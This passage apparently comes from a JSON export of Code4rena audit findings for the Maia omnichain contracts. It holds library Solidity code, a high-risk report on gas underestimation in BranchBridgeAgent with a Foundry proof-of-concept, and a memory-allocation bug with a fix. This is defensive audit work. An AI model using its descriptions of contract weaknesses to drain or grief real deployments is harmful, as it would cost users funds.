contract which uses `SELFDESTRUCT` to force send the ETH.     ///     /// Reverts if the current contract has insufficient balance.     function forceSafeTransferETH(address to, uint256 amount) internal {         // Manually inlined because the compiler doesn't inline functions with branches.         /// @solidity memory-safe-assembly         assembly {             // If insufficient balance, revert.             if lt(selfbalance(), amount) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Transfer the ETH and check if it succeeded or not.             if iszero(call(_GAS_STIPEND_NO_GRIEF, to, amount, 0, 0, 0, 0)) {                 mstore(0x00, to) // Store the address in scratch space.                 mstore8(0x0b, 0x73) // Opcode `PUSH20`.                 mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.                 // We can directly use `SELFDESTRUCT` in the contract creation.                 // Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758                 if iszero(create(amount, 0x0b, 0x16)) {                     // To coerce gas estimation to provide enough gas for the `create` above.                     if iszero(gt(gas(), 1000000)) {                         revert(0, 0)                     }                 }             }         }     }      /// @dev Sends `amount` (in wei) ETH to `to`, with a `gasStipend`.     /// The `gasStipend` can be set to a low enough value to prevent     /// storage writes or gas griefing.     ///     /// Simply use `gasleft()` for `gasStipend` if you don't need a gas stipend.     ///     /// Note: Does NOT revert upon failure.     /// Returns whether the transfer of ETH is successful instead.     function trySafeTransferETH(         address to,         uint256 amount,         uint256 gasStipend     ) internal returns (bool success) {         /// @solidity memory-safe-assembly         assembly {             // Transfer the ETH and check if it succeeded or not.             success := call(gasStipend, to, amount, 0, 0, 0, 0)         }     }      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                      ERC20 OPERATIONS                      */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev Sends `amount` of ERC20 `token` from `from` to `to`.     /// Reverts upon failure.     ///     /// The `from` account must have at least `amount` approved for     /// the current contract to manage.     function safeTransferFrom(         address token,         address from,         address to,         uint256 amount     ) internal {         /// @solidity memory-safe-assembly         assembly {             let m := mload(0x40) // Cache the free memory pointer.              mstore(0x60, amount) // Store the `amount` argument.             mstore(0x40, to) // Store the `to` argument.             mstore(0x2c, shl(96, from)) // Store the `from` argument.             // Store the function selector of `transferFrom(address,address,uint256)`.             mstore(0x0c, 0x23b872dd000000000000000000000000)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFromFailed()`.                 mstore(0x00, 0x7939f424)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              mstore(0x60, 0) // Restore the zero slot to zero.             mstore(0x40, m) // Restore the free memory pointer.         }     }      /// @dev Sends all of ERC20 `token` from `from` to `to`.     /// Reverts upon failure.     ///     /// The `from` account must have their entire balance approved for     /// the current contract to manage.     function safeTransferAllFrom(         address token,         address from,         address to     ) internal returns (uint256 amount) {         /// @solidity memory-safe-assembly         assembly {             let m := mload(0x40) // Cache the free memory pointer.              mstore(0x40, to) // Store the `to` argument.             mstore(0x2c, shl(96, from)) // Store the `from` argument.             // Store the function selector of `balanceOf(address)`.             mstore(0x0c, 0x70a08231000000000000000000000000)             if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     gt(returndatasize(), 0x1f), // At least 32 bytes returned.                     staticcall(gas(), token, 0x1c, 0x24, 0x60, 0x20)                 )             ) {                 // Store the function selector of `TransferFromFailed()`.                 mstore(0x00, 0x7939f424)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              // Store the function selector of `transferFrom(address,address,uint256)`.             mstore(0x00, 0x23b872dd)             // The `amount` argument is already written to the memory word at 0x60.             amount := mload(0x60)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFromFailed()`.                 mstore(0x00, 0x7939f424)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              mstore(0x60, 0) // Restore the zero slot to zero.             mstore(0x40, m) // Restore the free memory pointer.         }     }      /// @dev Sends `amount` of ERC20 `token` from the current contract to `to`.     /// Reverts upon failure.     function safeTransfer(address token, address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             mstore(0x14, to) // Store the `to` argument.             mstore(0x34, amount) // Store the `amount` argument.             // Store the function selector of `transfer(address,uint256)`.             mstore(0x00, 0xa9059cbb000000000000000000000000)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFailed()`.                 mstore(0x00, 0x90b8ec18)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Restore the part of the free memory pointer that was overwritten.             mstore(0x34, 0)         }     }      /// @dev Sends all of ERC20 `token` from the current contract to `to`.     /// Reverts upon failure.     function safeTransferAll(         address token,         address to     ) internal returns (uint256 amount) {         /// @solidity memory-safe-assembly         assembly {             mstore(0x00, 0x70a08231) // Store the function selector of `balanceOf(address)`.             mstore(0x20, address()) // Store the address of the current contract.             if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     gt(returndatasize(), 0x1f), // At least 32 bytes returned.                     staticcall(gas(), token, 0x1c, 0x24, 0x34, 0x20)                 )             ) {                 // Store the function selector of `TransferFailed()`.                 mstore(0x00, 0x90b8ec18)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              mstore(0x14, to) // Store the `to` argument.             // The `amount` argument is already written to the memory word at 0x34.             amount := mload(0x34)             // Store the function selector of `transfer(address,uint256)`.             mstore(0x00, 0xa9059cbb000000000000000000000000)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFailed()`.                 mstore(0x00, 0x90b8ec18)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Restore the part of the free memory pointer that was overwritten.             mstore(0x34, 0)         }     }      /// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract.     /// Reverts upon failure.     function safeApprove(address token, address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             mstore(0x14, to) // Store the `to` argument.             mstore(0x34, amount) // Store the `amount` argument.             // Store the function selector of `approve(address,uint256)`.             mstore(0x00, 0x095ea7b3000000000000000000000000)              if iszero(                 and(                     // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)                 )             ) {                 // Store the function selector of `ApproveFailed()`.                 mstore(0x00, 0x3e3f8f73)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Restore the part of the free memory pointer that was overwritten.             mstore(0x34, 0)         }     }      /// @dev Returns the amount of ERC20 `token` owned by `account`.     /// Returns zero if the `token` does not exist.     function balanceOf(         address token,         address account     ) internal view returns (uint256 amount) {         /// @solidity memory-safe-assembly         assembly {             mstore(0x14, account) // Store the `account` argument.             // Store the function selector of `balanceOf(address)`.             mstore(0x00, 0x70a08231000000000000000000000000)"}, {"title": "Overpaying remaining gas to the user or failing anyExecute call due to incorrect gas unit calculation in BranchBridgeAgent", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/607", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-16"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054   # Vulnerability details  ## Impact  #### Context: `anyExecute` method is called by Anycall Executor on the destination chain to execute interaction. The user has to pay for the remote call execution gas, this is done at the end of the call. However, if there is not enough gasRemaining, the  `anyExecute` will be reverted due to a revert caused by the Anycall Executor.  Here is the calculation for the gas used ```solidity  ///Save gas left  uint256 gasLeft = gasleft();   //Get Branch Environment Execution Cost  uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasLeft);   //Check if sufficient balance  if (minExecCost > gasRemaining) {   _forceRevert();   return;  } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054  `_forceRevert` will withdraw all execution budget. ```  // Withdraw all execution gas budget from anycall for tx to revert with \"no enough budget\"  if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {} ```  So Anycall Executor will revert if there is not enough budget. This is done at  ```solidity  uint256 budget = executionBudget[_from];  require(budget > totalCost, \"no enough budget\");  executionBudget[_from] = budget - totalCost; ``` https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L206C42-L206C58  #### (1) Gas Calculation:  To calculate how much the user has to pay, the following formula is used:  ```solidity         //Get Branch Environment Execution Cost         uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasLeft); ```  Gas units are calculated as follows: - Store gasleft() at initialGas at the beginning of `anyExecute` method ```solidity  //Get Initial Gas Checkpoint  uint256 initialGas = gasleft(); ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1125  - Nearly at the end of the method, deduct gasleft() from initialGas. This covers everything between initial gas checkpoint and end gas checkpoint. ```solidity         ///Save gas left         uint256 gasLeft = gasleft();          //Get Branch Environment Execution Cost         uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasLeft); ```  - Add MIN_EXECUTION_OVERHEAD which is 160_000.   ```     uint256 internal constant MIN_EXECUTION_OVERHEAD = 160_000; // 100_000 for anycall + 35_000 Pre 1st Gas Checkpoint Execution + 25_000 Post last Gas Checkpoint Executions ```  This overhead is supposed to cover: - **100_000 for anycall**. This is extra cost required by Anycall ```solidity Line:38  uint256 constant EXECUTION_OVERHEAD = 100000;  .  . Line:203  uint256 gasUsed = _prevGasLeft + EXECUTION_OVERHEAD - gasleft(); ``` https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203  - **35_000 Pre 1st Gas Checkpoint Execution**. For example, to cover the modifier `requiresExecutor`  - **25_000 Post Last Gas Checkpoint Execution**. To cover everthing after the end gas checkpoint. ```solidity  //Get Branch Environment Execution Cost  uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasLeft);   //Check if sufficient balance  if (minExecCost > gasRemaining) {   _forceRevert();   return;  }   //Replenish Gas  _replenishGas(minExecCost);   //Transfer gas remaining to recipient  SafeTransferLib.safeTransferETH(_recipient, gasRemaining - minExecCost);   //Save Gas  uint256 gasAfterTransfer = gasleft();   //Check if sufficient balance  if (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD) {   _forceRevert();   return;  } ```   The issue is that **60_000 is not enough to cover pre 1st gas checkpoint and post last gas checkpoint**. This means that the user paying less than the actual gas cost. According to the sponsor, Bridge Agent deployer deposits first time into anycallConfig where the goal is to replenish the execution budget after use every time. The issue could possibly lead to: 1. **Overpaying the remaining gas the user **. 2. **execution budget is decreasing over time (slow draining)** in case it has funds already. 3. **anyExecute calls will fail** since the calculation of the gas used in the Anycall contracts is way bigger. In Anycall, this is done by the modifier `chargeDestFee`  - modifier `chargeDestFee`  ```solidity   modifier chargeDestFee(address _from, uint256 _flags) {   if (_isSet(_flags, AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {    uint256 _prevGasLeft = gasleft();    _;    IAnycallConfig(config).chargeFeeOnDestChain(_from, _prevGasLeft);   } else {    _;   }  }  ```  https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L163-L171    - function `chargeFeeOnDestChain`  ```solidity   function chargeFeeOnDestChain(address _from, uint256 _prevGasLeft)    external    onlyAnycallContract   {    if (!_isSet(mode, FREE_MODE)) {     uint256 gasUsed = _prevGasLeft + EXECUTION_OVERHEAD - gasleft();     uint256 totalCost = gasUsed * (tx.gasprice + _feeData.premium);     uint256 budget = executionBudget[_from];     require(budget > totalCost, \"no enough budget\");     executionBudget[_from] = budget - totalCost;     _feeData.accruedFees += uint128(totalCost);    }   }  ```  https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203  #### (3) Gas Calculation in AnyCall:  There is also a gas consumption at `anyExec` method called by the MPC (in AnyCall) here ```solidity     function anyExec(         address _to,         bytes calldata _data,         string calldata _appID,         RequestContext calldata _ctx,         bytes calldata _extdata     )         external         virtual         lock         whenNotPaused         chargeDestFee(_to, _ctx.flags) // <= starting from here         onlyMPC     {   .   .   .   bool success = _execute(_to, _data, _ctx, _extdata);   .   .    } ```  https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L276  **The gas is nearly 110_000**. It is not taken into account.    #### (3) Base Fee & Input Data Fee:  From [Ethereum yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf):  > Gtransaction 21000 Paid for every transaction > Gtxdatazero 4 Paid for every zero byte of data or code for a transaction. > Gtxdatanonzero 16 Paid for every non-zero byte of data or code for a transaction.  So 1. We have 21_000 as a base fee. This should be taken into account. However, it is paid by AnyCall, since the TX is sent by MPC. So, we are fine here. Probably this explains the overhead (100_000) added by anycall  2. Because `anyExecute` method has bytes data to be passed, we have extra gas consumption which is not taken into account.  For every zero byte => 4  For every non-zero byte => 16  So generally speaking, the bigger the data is, the bigger the gas becomes. you can simply prove this by adding arbitrary data to `anyExecute` method in PoC#1 test below. and you will see the gas spent increases.   #### Summary  1. **MIN_EXECUTION_OVERHEAD is underestimated**. 2. **The gas consumed by `anyExec` method called by the MPC is not considered**. 3. **Input data fee isn't taken into account**.  There are two PoCs proving the first two points above. The third point can be proven by simply adding arbitrary data to `anyExecute` method in PoC#1 test.  ## Proof of Concept  ### PoC#1 (MIN_EXECUTION_OVERHEAD is underestimated)  #### Overview This PoC is independent from the codebase (but uses the same code). There are two contracts simulating `BranchBridgeAgent.anyExecute`. 1. **BranchBridgeAgent** which has the code of pre 1st gas checkpoint and  post last gas checkpoint. 2. **BranchBridgeAgentEmpty** which has the code of pre 1st gas checkpoint and  post last gas checkpoint **commented out**.  We run the same test for both, the difference in gas is what\u2019s at least nearly the minimum required to cover pre 1st gas checkpoint and  post last gas checkpoint. In this case here it is **78097** which is bigger than 60_000.  Here is the output of the test:  ```sh [PASS] test_calcgas() (gas: 119050) Logs:   branchBridgeAgent.anyExecute Gas Spent => 92852  [PASS] test_calcgasEmpty() (gas: 44461) Logs:   branchBridgeAgentEmpty.anyExecute Gas Spent => 14755 ```  **92852-14755 = 78097**  #### Explanation   `BranchBridgeAgent.anyExecute` method depends on the following external calls: 1. `AnycallExecutor.context()` 2. `AnycallProxy.config()` 3. `AnycallConfig.executionBudget()` 4. `AnycallConfig.withdraw()` 5. `AnycallConfig.deposit()` 6. `WETH9.withdraw()`  For this reason, I've copied the same code from [multichain-smart-contracts](https://github.com/anyswap/multichain-smart-contracts). For WETH9, I've used the contract from the codebase which has minimal code.  Please note that: - **tx.gasprice** is replaced with a fixed value in `_payExecutionGas` method as it is not available in Foundry. - In `_replenishGas`, reading the config via `IAnycallProxy(localAnyCallAddress).config()` is replaced with Immediate call for simplicity. In other words, avoiding proxy to make the PoC simpler and shorter. However, if done with proxy the gas used would increase. So in both ways, it is in favor of the PoC. - The condition `if (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD)` is replaced with `if (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD && false)` . This is to avoid entering the forceRevert. The increase of gas here is negligible anyway.   ####  The coded PoC  - Foundry.toml ```sh  [profile.default]  solc = '0.8.17'  src = 'solidity'  test = 'solidity/test'  out = 'out'  libs = ['lib']  fuzz_runs = 1000  optimizer_runs = 10_000 ```  - .gitmodules ```sh  [submodule \"lib/ds-test\"]   path = lib/ds-test   url = https://github.com/dapphub/ds-test   branch = master  [submodule \"lib/forge-std\"]   path = lib/forge-std   url = https://github.com/brockelmore/forge-std   branch = master ```  - remappings.txt ```sh  ds-test/=lib/ds-test/src  forge-std/=lib/forge-std/src ```  - Test File ```solidity // PoC => Maia OmniChain: gasCalculation in BranchBridgeAgent   pragma solidity >=0.8.4 <0.9.0;  import {Test} from \"forge-std/Test.sol\"; import \"forge-std/console.sol\";  import {DSTest} from \"ds-test/test.sol\";    library SafeTransferLib {     /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                       CUSTOM ERRORS                        */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev The ETH transfer has failed.     error ETHTransferFailed();      /// @dev The ERC20 `transferFrom` has failed.     error TransferFromFailed();      /// @dev The ERC20 `transfer` has failed.     error TransferFailed();      /// @dev The ERC20 `approve` has failed.     error ApproveFailed();      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                         CONSTANTS                          */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev Suggested gas stipend for contract receiving ETH     /// that disallows any storage writes.     uint256 internal constant _GAS_STIPEND_NO_STORAGE_WRITES = 2300;      /// @dev Suggested gas stipend for contract receiving ETH to perform a few     /// storage reads and writes, but low enough to prevent griefing.     /// Multiply by a small constant (e.g. 2), if needed.     uint256 internal constant _GAS_STIPEND_NO_GRIEF = 100000;      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                       ETH OPERATIONS                       */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev Sends `amount` (in wei) ETH to `to`.     /// Reverts upon failure.     ///     /// Note: This implementation does NOT protect against gas griefing.     /// Please use `forceSafeTransferETH` for gas griefing protection.     function safeTransferETH(address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             // Transfer the ETH and check if it succeeded or not.             if iszero(call(gas(), to, amount, 0, 0, 0, 0)) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }         }     }      /// @dev Force sends `amount` (in wei) ETH to `to`, with a `gasStipend`.     /// The `gasStipend` can be set to a low enough value to prevent     /// storage writes or gas griefing.     ///     /// If sending via the normal procedure fails, force sends the ETH by     /// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.     ///     /// Reverts if the current contract has insufficient balance.     function forceSafeTransferETH(address to, uint256 amount, uint256 gasStipend) internal {         /// @solidity memory-safe-assembly         assembly {             // If insufficient balance, revert.             if lt(selfbalance(), amount) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Transfer the ETH and check if it succeeded or not.             if iszero(call(gasStipend, to, amount, 0, 0, 0, 0)) {                 mstore(0x00, to) // Store the address in scratch space.                 mstore8(0x0b, 0x73) // Opcode `PUSH20`.                 mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.                 // We can directly use `SELFDESTRUCT` in the contract creation.                 // Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758                 if iszero(create(amount, 0x0b, 0x16)) {                     // To coerce gas estimation to provide enough gas for the `create` above.                     if iszero(gt(gas(), 1000000)) { revert(0, 0) }                 }             }         }     }      /// @dev Force sends `amount` (in wei) ETH to `to`, with a gas stipend     /// equal to `_GAS_STIPEND_NO_GRIEF`. This gas stipend is a reasonable default     /// for 99% of cases and can be overridden with the three-argument version of this     /// function if necessary.     ///     /// If sending via the normal procedure fails, force sends the ETH by     /// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.     ///     /// Reverts if the current contract has insufficient balance.     function forceSafeTransferETH(address to, uint256 amount) internal {         // Manually inlined because the compiler doesn't inline functions with branches.         /// @solidity memory-safe-assembly         assembly {             // If insufficient balance, revert.             if lt(selfbalance(), amount) {                 // Store the function selector of `ETHTransferFailed()`.                 mstore(0x00, 0xb12d13eb)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }             // Transfer the ETH and check if it succeeded or not.             if iszero(call(_GAS_STIPEND_NO_GRIEF, to, amount, 0, 0, 0, 0)) {                 mstore(0x00, to) // Store the address in scratch space.                 mstore8(0x0b, 0x73) // Opcode `PUSH20`.                 mstore8(0x20, 0xff) // Opcode `SELFDESTRUCT`.                 // We can directly use `SELFDESTRUCT` in the contract creation.                 // Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758                 if iszero(create(amount, 0x0b, 0x16)) {                     // To coerce gas estimation to provide enough gas for the `create` above.                     if iszero(gt(gas(), 1000000)) { revert(0, 0) }                 }             }         }     }      /// @dev Sends `amount` (in wei) ETH to `to`, with a `gasStipend`.     /// The `gasStipend` can be set to a low enough value to prevent     /// storage writes or gas griefing.     ///     /// Simply use `gasleft()` for `gasStipend` if you don't need a gas stipend.     ///     /// Note: Does NOT revert upon failure.     /// Returns whether the transfer of ETH is successful instead.     function trySafeTransferETH(address to, uint256 amount, uint256 gasStipend)         internal         returns (bool success)     {         /// @solidity memory-safe-assembly         assembly {             // Transfer the ETH and check if it succeeded or not.             success := call(gasStipend, to, amount, 0, 0, 0, 0)         }     }      /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/     /*                      ERC20 OPERATIONS                      */     /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/      /// @dev Sends `amount` of ERC20 `token` from `from` to `to`.     /// Reverts upon failure.     ///     /// The `from` account must have at least `amount` approved for     /// the current contract to manage.     function safeTransferFrom(address token, address from, address to, uint256 amount) internal {         /// @solidity memory-safe-assembly         assembly {             let m := mload(0x40) // Cache the free memory pointer.              mstore(0x60, amount) // Store the `amount` argument.             mstore(0x40, to) // Store the `to` argument.             mstore(0x2c, shl(96, from)) // Store the `from` argument.             // Store the function selector of `transferFrom(address,address,uint256)`.             mstore(0x0c, 0x23b872dd000000000000000000000000)              if iszero(                 and( // The arguments of `and` are evaluated from right to left.                     // Set success to whether the call reverted, if not we check it either                     // returned exactly 1 (can't just be non-zero data), or had no return data.                     or(eq(mload(0x00), 1), iszero(returndatasize())),                     call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)                 )             ) {                 // Store the function selector of `TransferFromFailed()`.                 mstore(0x00, 0x7939f424)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              mstore(0x60, 0) // Restore the zero slot to zero.             mstore(0x40, m) // Restore the free memory pointer.         }     }      /// @dev Sends all of ERC20 `token` from `from` to `to`.     /// Reverts upon failure.     ///     /// The `from` account must have their entire balance approved for     /// the current contract to manage.     function safeTransferAllFrom(address token, address from, address to)         internal         returns (uint256 amount)     {         /// @solidity memory-safe-assembly         assembly {             let m := mload(0x40) // Cache the free memory pointer.              mstore(0x40, to) // Store the `to` argument.             mstore(0x2c, shl(96, from)) // Store the `from` argument.             // Store the function selector of `balanceOf(address)`.             mstore(0x0c, 0x70a08231000000000000000000000000)             if iszero(                 and( // The arguments of `and` are evaluated from right to left.                     gt(returndatasize(), 0x1f), // At least 32 bytes returned.                     staticcall(gas(), token, 0x1c, 0x24, 0x60, 0x20)                 )             ) {                 // Store the function selector of `TransferFromFailed()`.                 mstore(0x00, 0x7939f424)                 // Revert with (offset, size).                 revert(0x1c, 0x04)             }              // Store the function selector of `transferFrom(address,address,uint256)`.             mstore(0x00, 0x23b872dd)             // The `amount` argument is already written to the memory word "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/602", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-15"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/hunter_w3b-G.md)."}, {"title": "BranchBridgeAgent._normalizeDecimalsMultiple will always revert because of lacking of allocating memory", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/598", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-15"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1349-L1357   # Vulnerability details  ## Impact BranchBridgeAgent._normalizeDecimalsMultiple will always revert because of lacking of allocating memory  ## Proof of Concept [BranchBridgeAgent._normalizeDecimalsMultiple](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1349-L1357)'s code as below, because `deposits` is never allocated memory, the function will always revert ```solidity     function _normalizeDecimalsMultiple(uint256[] memory _deposits, address[] memory _tokens)         internal         view         returns (uint256[] memory deposits)     {         for (uint256 i = 0; i < _deposits.length; i++) {             deposits[i] = _normalizeDecimals(_deposits[i], ERC20(_tokens[i]).decimals());         }     } ```  ## Tools Used VS ## Recommended Mitigation Steps ```solidity @@ -1351,7 +1351,9 @@          view          returns (uint256[] memory deposits)      { -        for (uint256 i = 0; i < _deposits.length; i++) { +        uint len = _deposits.length; +        deposits = new uint256[](len); +        for (uint256 i = 0; i < len; i++) {              deposits[i] = _normalizeDecimals(_deposits[i], ERC20(_tokens[i]).decimals());          }      }  ```   ## Assessed type  Error"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/597", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-09"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/ltyu-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/590", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-10"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Madalad-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/587", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-11"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/0xSmartContract-Analysis.md)."}, {"title": "QA Report", "html_url": 